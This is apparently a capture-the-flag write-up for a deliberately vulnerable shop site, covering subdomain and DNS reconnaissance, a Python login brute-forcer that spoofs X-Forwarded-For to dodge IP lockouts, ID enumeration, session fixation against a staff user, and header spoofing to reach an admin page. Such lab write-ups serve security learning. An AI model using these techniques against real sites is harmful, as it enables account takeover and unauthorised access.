# VulnCommerce

http://www.vulncommerce.co.uk - 8 flags to find

![alt](./images/vulncommerce-01.png)

So browsed through the pages click all buttons and just observed the traffic. I noticed the images had requests like this

```
GET /upload_dir_34f9gGo/laptop2.png HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://www.vulncommerce.co.uk/?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM=
Cookie: ctfchallenge=xxx; session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM%3D
Cache-Control: max-age=0
```

So I have a look at this directory and I can get a directory listing

![listing](./images/vulncommerce-02.png)

Have a look in the tech directory and there's an updates.txt file with the following in it

```
[^FLAG^xxx^FLAG^]

### UPDATES ###

1) Server migration is now complete, Clients requests first go to the load balancer and will then be forwarded to an available server. We currently only have one server but will add some more soon.

2) We've setup a test page at "/email-signup-trial" to accept emails for newsletters. Please give it a try and let us know if you have problems.
```

Flag no. 3 found

OK good start, lets try doing some subdomain enumeration and then look at the content on the main app and then back again to subdomains if I find anything :)

So yes I find something with assetfinder :). Nothing with the subdomain word list though. OK save these for later

```
└─$ assetfinder -subs-only vulncommerce.co.uk
vulncommerce.co.uk
hq.vulncommerce.co.uk
web-version-manager.vulncommerce.co.uk
vulncommerce.co.uk
vulncommerce.co.uk
```

Quick review of the pages we know about on the main app and their actions.

OK so Product pages for example ```http://www.vulncommerce.co.uk/product/1```

![alt](./images/vulncommerce-03.png)

Adding a product to the basket makes a request like

```
POST /product/1?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM= HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://www.vulncommerce.co.uk
Connection: close
Referer: http://www.vulncommerce.co.uk/product/1?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM=
Cookie: session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM%3D; ctfchallenge=xxx; session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM%3D
Upgrade-Insecure-Requests: 1

product_id=1
```

The basket ```http://www.vulncommerce.co.uk/basket```

![basket](./images/vulncommerce-04.png)

A request to pay fails, and doesn't actually contain of the address/payment details

```
POST /basket?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM= HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://www.vulncommerce.co.uk
Connection: close
Referer: http://www.vulncommerce.co.uk/basket?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM=
Cookie: ctfchallenge=xxx; session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM%3D
Upgrade-Insecure-Requests: 1

action=pay
```

Changing the value of action from pay to anything else doesn't seem to matter, changed to both xxx and blank an receive the same message

```
Error processing payment details, please try again later
```

Removing an item from the basket uses the following request format

```
POST /basket?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM= HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://www.vulncommerce.co.uk
Connection: close
Referer: http://www.vulncommerce.co.uk/basket?session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM=
Cookie: ctfchallenge=xxx; session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM%3D
Upgrade-Insecure-Requests: 1

basket_id=9703
```

The basket id just seems to increment each time an item is added to the basket

And login, which tells me when a username is not known

![alt](./images/vulncommerce-05.png)

```
POST /login?session_id=YzhiMjM2ZTBjMTMyNGFiOTZhYzExYTBjYjI3MDAxYzAxNGNiZjgxMmU1YzM0ZGY1ZWRkNDA1NDVmOTIyNDM0YjYyMGVlZmYxYTBkM2NlNWY2MjQzYTI5Mjg4ZDI4Y2I4NzBlMzhhYTU0ZTE5MDU5NTE0MWQ0NDIwMDljM2VjNTI= HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 217
Origin: http://www.vulncommerce.co.uk
Connection: close
Referer: http://www.vulncommerce.co.uk/login?session_id=YzhiMjM2ZTBjMTMyNGFiOTZhYzExYTBjYjI3MDAxYzAxNGNiZjgxMmU1YzM0ZGY1ZWRkNDA1NDVmOTIyNDM0YjYyMGVlZmYxYTBkM2NlNWY2MjQzYTI5Mjg4ZDI4Y2I4NzBlMzhhYTU0ZTE5MDU5NTE0MWQ0NDIwMDljM2VjNTI=
Cookie: ctfchallenge=xxx; session_id=YzhiMjM2ZTBjMTMyNGFiOTZhYzExYTBjYjI3MDAxYzAxNGNiZjgxMmU1YzM0ZGY1ZWRkNDA1NDVmOTIyNDM0YjYyMGVlZmYxYTBkM2NlNWY2MjQzYTI5Mjg4ZDI4Y2I4NzBlMzhhYTU0ZTE5MDU5NTE0MWQ0NDIwMDljM2VjNTI%3D
Upgrade-Insecure-Requests: 1

csrf=ZTE5MTliNTgyM2QxODVkYTU2MzJhNTFiZjYwMTJkZmNiNTM4ZjgzNDM5MGUwZTYyN2ZkOTljOTlhMzRhMjIxOTE4OWZhNzYwOTc1MzNjYzQ3YzJkOWJhOGQ3OTM2MGFlNGNjNjgwZGU5YjI2OWFlMTNkNzIwYTQ5NzM3N2E2NjQ%3D&login_username=aaa&login_password=aaa
```

So it has a CSRF token in the request. And if I make 3 incorrect login attempts I get the message

```
Your IP is banned from attempting to login for another 3600 seconds
```

If however I add the `X-Forwarded-For` header with a new IP I can make another request, the CSRF token refreshes with each refresh of the page.

Doing a quick FUZZ for content on `http://www.vulncommerce.co.uk/FUZZ` gives me a couple of things back which I've not seen yet

- profile - 302 redirect to login so I need to hack the above login to enumerate user and then find the password
- stats - 200 response with the below page

![alt](./images/vulncommerce-06.png)

OK there's flag no. 2 :)

The network test seems to be a ping against the Goggle DNS 8.8.8.8

```
POST /stats HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://www.vulncommerce.co.uk
Connection: close
Referer: http://www.vulncommerce.co.uk/stats?session_id=YzhiMjM2ZTBjMTMyNGFiOTZhYzExYTBjYjI3MDAxYzAxNGNiZjgxMmU1YzM0ZGY1ZWRkNDA1NDVmOTIyNDM0YjYyMGVlZmYxYTBkM2NlNWY2MjQzYTI5Mjg4ZDI4Y2I4NzBlMzhhYTU0ZTE5MDU5NTE0MWQ0NDIwMDljM2VjNTI=
Cookie: ctfchallenge=xxx; session_id=YmU3MjlkNmVkZmViM2Y0ZWY1YzI4OWQxOWY1ZWE0MDhiM2VkYzZhZTRjYzhjNmY1NmQ3MjYyODI3Yzg2NTA4ZTcyY2NkMjRiMTcyMmExNTQ3ZDY2M2Y4NmI3NmJmMzE3ODVlMzVkMjBhNzFkYzUxM2ZjMmRmYWUxOGI1ZTc3YzM%3D
Upgrade-Insecure-Requests: 1

ping_target=8.8.8.8
```

The page changes to include the message below after clicking the send test button

```
Target: 8.8.8.8
Result: PASS
```

Some potential use for later maybe? For example the other Google DNS 8.8.4.4 works as does 127.0.0.1, perhaps I might be able to use it....

OK let's try and focus on the login, I'm going to script this in python rather than using Burp.

Bit of playing and this script worked well for me in the end

```python
import requests
import random
from bs4 import BeautifulSoup

siteurl = "http://www.vulncommerce.co.uk/login?session_id=xxx"
ctfchallenge_cookie = {'ctfchallenge': 'xxx'}
burp_proxy = {'http': 'http://127.0.0.1:8080'}
usernames = '/usr/share/wordlists/ctfchallenge/usernames.txt'
passwords = '/usr/share/wordlists/ctfchallenge/passwords-large.txt'

def getCSRFToken():
    r = requests.get(siteurl, cookies=ctfchallenge_cookie, proxies=burp_proxy, headers= {'X-Forwarded-For': generateRandomIP()})
    html = BeautifulSoup(r.text, 'html.parser')
    return html.find('input', {'name':'csrf'}).attrs['value']

def findUsername():
    with open(usernames, 'r') as users:
        formData = {'login_username' : '{}', 'login_password': 'aaa'}
        return login(users, formData, "Username not recognised")

def findPassword(username):
    with open(passwords, 'r') as pwords:
        formData = {'login_username': username, 'login_password': '{}'}
        return login(pwords, formData, "Password incorrect for username")

def login(wordList, formData, failureText):
    for word in wordList:
        word = word.rstrip()
        formData['csrf'] = getCSRFToken()
        prevUser = formData['login_username']
        prevPassword = formData['login_password']
        formData['login_username'] = formData['login_username'].format(word)
        formData['login_password'] = formData['login_password'].format(word)
        r = requests.post(siteurl, cookies=ctfchallenge_cookie, data=formData, proxies=burp_proxy, headers= {'X-Forwarded-For': generateRandomIP()})
        if failureText not in r.text:
            return word
        formData['login_username'] = prevUser
        formData['login_password'] = prevPassword

def generateRandomIP():
    return f"94.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"


username = findUsername()
password = findPassword(username)
print(f"Username is {username}")
print(f"Password is {password}")
```

When it finished I had the following printed out

```
Username is admin
Password is htubcnhfwbz
```

And I can now login and see admins profile

![1](./images/vulncommerce-07.png)

Looks like I skipped a few steps though as this is flag no. 8 :D

So before I go and look at the subdomains lets have a look at the email-signup-trial path we found earlier.

![alt](./images/vulncommerce-08.png)

I signup and I get an automated email from noreply@vulncommerce.co.uk

```
Please click the following link to confirm the status of your email subscription http://www.vulncommerce.co.uk/email-status/86/93db85ed909c13838ff95ccfa94cebd9 
```

Which when I click it this is the page I see

![alt](./images/vulncommerce-09.png)

Notice the id 86 in the path followed by an MD5 hash `93db85ed909c13838ff95ccfa94cebd9`, quick check of crackstation and it tells me this is the MD5 hash of 86. So what other ID's are there? Let's fuzz them with Burp Intruder >:)

So I get a lot back, but only one has the flag, id no.8

![alt](./images/vulncommerce-10.png)

Flag no.4. Still missing flag 1.....

Might come back to that, for now time to focus on those subdomains

- hq.vulncommerce.co.uk
- web-version-manager.vulncommerce.co.uk

So hq doesn't appear to load anything in the browser. Lets check it out a bit further

```
└─$ host hq.vulncommerce.co.uk                             
hq.vulncommerce.co.uk has address 8.8.17.22
```

OK so is this a DNS or something?

Shodan.io has no record of it and an nmap scan on the first 1000 ports brings back nothing either.

Similar story for web-version-manager, except it looks like an LAN IP

```
└─$ host web-version-manager.vulncommerce.co.uk            
web-version-manager.vulncommerce.co.uk has address 192.9.1.122
web-version-manager.vulncommerce.co.uk has IPv6 address 2a03:b0c0:1:d0::c70:1
```

Let me go back to the http://www.vulncommerce.co.uk/stats page to see if I can ping these addresses from the network test tool

- 8.8.17.22 - FAIL
- 192.9.1.122 - FAIL

Hmmmm.....

Lets try similar on the main domain

```
└─$ host vulncommerce.co.uk
vulncommerce.co.uk has address 68.183.255.206
vulncommerce.co.uk mail is handled by 10 mx.sendgrid.net
```

OK perhaps dnsrecon can give more information

```
└─$ dnsrecon -d vulncommerce.co.uk
[*] std: Performing General Enumeration against: vulncommerce.co.uk...
[-] DNSSEC is not configured for vulncommerce.co.uk
[*] 	 SOA ns1.digitalocean.com 173.245.58.51
[*] 	 SOA ns1.digitalocean.com 2400:cb00:2049:1::adf5:3a33
[*] 	 NS ns1.digitalocean.com 173.245.58.51
[*] 	 NS ns1.digitalocean.com 2400:cb00:2049:1::adf5:3a33
[*] 	 NS ns2.digitalocean.com 173.245.59.41
[*] 	 NS ns2.digitalocean.com 2400:cb00:2049:1::adf5:3b29
[*] 	 NS ns3.digitalocean.com 198.41.222.173
[*] 	 NS ns3.digitalocean.com 2400:cb00:2049:1::c629:dead
[*] 	 MX mx.sendgrid.net 167.89.123.50
[*] 	 MX mx.sendgrid.net 167.89.115.46
[*] 	 A vulncommerce.co.uk 68.183.255.206
[*] 	 TXT vulncommerce.co.uk [^FLAG^xxx^FLAG^]
[*] Enumerating SRV Records
[+] 0 Records Found
```

Aha there's the elusive flag no.1 :)

OK so moving on, flag 5 would be the logical one to get next. Flag no.4 gave us an email address (simon.boswell@vulncommerce.co.uk) so that may have something to do with it.

Something I have noticed is that the session id is reflected for every page in a query parameter for example

```
http://vulncommerce.co.uk/login?session_id=ODk1NDIxYmUyYzFjNjQyZWM0YjJlYmI1Mzc1MzQ1MzRjMmM5Y2Q4NGJjYmFmZWY4M2VjYjRmOWNmZjdkZTU4ODY0ZGRlZDM5MGMwNTE2ZTkzMjQxMmExZWRkNzc5ZDEzZGNiNDBkZDQ0OWYyNTRiYmUyM2I1ZDgwMWM2M2M0Mzc=
```

It's a bit of a weird place to store a session id, lets email simon this link to see if he automatically follows it and then I may end up being him....

After waiting a minute or two and refreshing the page, I notice that simon is signed in, click his name and there is flag no. 5

![alt](./images/vulncommerce-11.png)

Have a new link too which gives the message

```
Connection from <my-ip> not allowed
```

I tried with 8.8.17.22 and 192.9.1.122 (setting the X-Forwarded-For) but these also give the same problem. I wonder if using the network test tool I can enumerate IP's that work on either of those ranges?

Here's an example of that request and response

```
GET /adm1n-man4gem3nt-12bfb3 HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Forwarded-For: 8.8.17.22
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ctfchallenge=xxx
Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 200 OK
server: nginx/1.21.1
date: Thu, 30 Jun 2022 07:25:09 GMT
content-type: text/html; charset=UTF-8
set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulncommerce.co.uk
connection: close
Content-Length: 51

Connection from 8.8.17.22,<my-ip> not allowed
```

OK let's consider where I am at the moment, so the profile page for simon gave me a hint with he message

```
There's no username and password for it because the only place you can view it from is HQ (so don't tell anyone else in the office)
```

Also from the discovery earlier in the updates.txt

```
Clients requests first go to the load balancer and will then be forwarded to an available server. We currently only have one server but will add some more soon.
```

So I can only access that page from HQ, which we know about an IP (8.8.17.22) associated with it from the host command

```
└─$ host hq.vulncommerce.co.uk                             
hq.vulncommerce.co.uk has address 8.8.17.22
```

I also have the ping tool which it seems I can ping any public IP, but I can't ping 8.8.17.22 which I have to assume is a internal private range...

And how about the load balancer, I guess that must be the IP behind the main domain vulncommerce.co.uk

```
└─$ host vulncommerce.co.uk   
vulncommerce.co.uk has address 68.183.255.206
vulncommerce.co.uk mail is handled by 10 mx00.ionos.co.uk.
vulncommerce.co.uk mail is handled by 10 mx01.ionos.co.uk.
```

So can I use the assumed IP of the load balancer to discover the IP of the server it forwards it requests to? Lets try a fuzz with Burp Intruder such as the below using the `X-Forwarded-For` header and a fuzz range of 0-255

```
POST /stats HTTP/1.1
Host: www.vulncommerce.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Forwarded-For: 68.183.255.206
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://www.vulncommerce.co.uk
Connection: close
Referer: http://www.vulncommerce.co.uk/stats
Cookie: ctfchallenge=xxx
Upgrade-Insecure-Requests: 1

ping_target=8.8.17.<FUZZ>
```

And no still all FAIL results. I feel I'm on the right track I'm just missing a small part of the puzzle...

OK so I can also ping my own IP, as in the public IP of my router, if I can monitor ping requests then perhaps I can see who's pinged me. One problem with this is my router does not support forwarding. Sooo... I setup a basic VPS and ran the following command and pinged my VPS IP from the stats page

```
:¬# tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
12:17:10.232064 IP 159.65.24.127 > xxx: ICMP echo request, id 40330, seq 1, length 64
```

So now all I need to do is to adjust my request to the admin page like so (host is the IP above not the load balancer and the X-Forwarded-For is coming from HQ)

```
GET /adm1n-man4gem3nt-12bfb3?session_id=ODcyZjI5OWE2MGI3YTVjYWQxMGY3OThiNWQzY2JjYTljZWJmNjFlMGZmODA0Nzg2MzVhOTA3NDVjM2ZlMjBjMzFmYjJlMDA3OWNlNjZkYWJhZmQzNThjYmJhMGI4OGQyNzBiY2Q0NDlmNjU2NmVjZGZkZDk4MDVhOWNlOGI1MjE= HTTP/1.1
Host: 159.65.24.127
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
X-Forwarded-For: 8.8.17.22
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: ctfchallenge=xxx=;
Connection: close
Upgrade-Insecure-Requests: 1
```

And the response

![flag](./images/vulncommerce-12.png)

Finally flag 6!

Right OK so on to web-version-manager, quick reminder on the DNS recon

```
└─$ dnsrecon -d web-version-manager.vulncommerce.co.uk
[*] std: Performing General Enumeration against: web-version-manager.vulncommerce.co.uk...
[-] DNSSEC is not configured for web-version-manager.vulncommerce.co.uk
[*] 	 A web-version-manager.vulncommerce.co.uk 192.9.1.122
[*] 	 AAAA web-version-manager.vulncommerce.co.uk 2a03:b0c0:1:d0::c70:1
[*] Enumerating SRV Records
[+] 0 Records Found
```

Now the DNS A record I obviously can't do anything with that, the AAAA record however gives an IPv6 address. I tried browsing to `http://[2a03:b0c0:1:d0::c70:1]`, but this didn't work (Network is unreachable)

So this appears to be because all my IPv6 routing isn't configured locally, so for me the easiest option was again via the VPS, enabling VPS then configuration on digitalocean as outlined in this link `https://docs.digitalocean.com/products/networking/ipv6/how-to/enable/#on-existing-droplets`

Then I can curl the following from my droplet

```
curl http://[2a03:b0c0:1:d0::c70:1]
```

And finally I can see content and form to login with, see below response

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Continuous Integration Server Login</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container" style="margin-top:20px;">
    <div class="row">
        <div class="col-md-6 col-md-offset-3">

            
            <div class="panel panel-default">
                <div class="panel-heading">Login</div>
                <div class="panel-body">

                    <form method="post">
                        <div><label>Username</label></div>
                        <div><input class="form-control" name="username"></div>
                        <div style="margin-top:7px"><label>Password</label></div>
                        <div><input type="password" class="form-control" name="password"></div>
                        <div style="margin-top:20px"><input type="submit" class="btn btn-success pull-right" value="Login"></div>
                    </form>
                </div>
            </div>

        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

Cool so I have a username/password lets tweak the curl to post the data remembering special characters....

```
curl -d username=admin --data-urlencode password=*Gk3@0Y#3DJPshtEI http://[2a03:b0c0:1:d0::c70:1]
```

And BOOM flag no.7 returned in the response challenge complete! :D

```
<h4 style="text-align: center">[^FLAG^xxx^FLAG^]</h4>
```